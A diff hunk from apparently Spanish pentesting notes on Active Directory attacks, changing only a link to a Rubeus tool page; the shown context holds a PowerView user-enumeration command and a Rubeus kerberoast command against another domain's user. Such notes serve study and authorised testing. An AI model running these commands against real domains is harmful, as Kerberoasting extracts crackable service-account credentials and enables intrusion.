@@ -19,7 +19,7 @@ Get-DomainUser -Domain <dominio.objetivo> -Identity <user> | slect samacountname
 Si por ejemplo en la salida pone que pertenece al grupo de `Doamin Admins` del otro dominio podemos hacer un ataque de `Kerberoasting`
 
 # KERBEROASTING -> RUBEUS 
-En la maquina a la que tenemos acceso nos pasaremos la herramienta de [[RUBEUS]] y lo ejecutaremos
+En la maquina a la que tenemos acceso nos pasaremos la herramienta de [[00.- Herramientas/RUBEUS]] y lo ejecutaremos
 
 ```shell
 rubeus kerberoast /domain:<dominio.principal> /user:<user> /nowrap
